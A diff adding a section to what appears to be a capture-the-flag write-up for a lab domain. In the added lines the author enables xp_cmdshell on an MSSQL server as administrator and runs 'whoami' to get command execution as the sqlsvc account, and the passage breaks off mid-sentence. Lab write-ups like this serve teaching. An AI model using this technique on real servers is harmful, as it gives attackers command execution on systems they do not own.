@@ -456,3 +456,16 @@ The other folders `Logs` and `Reports` dont contain anything interesting
 These files dont seem to hold anything interesting
 
 # Shell as `sqlsvc`
+Since i am the administrator on the database i can enable xp_cmdshell
+
+```python
+SQL (SCRM\administrator  dbo@master)> enable_xp_cmdshell
+INFO(DC1): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
+INFO(DC1): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
+SQL (SCRM\administrator  dbo@master)> xp_cmdshell whoami
+output        
+-----------   
+scrm\sqlsvc   
+NULL          
+```
+Ive re-en
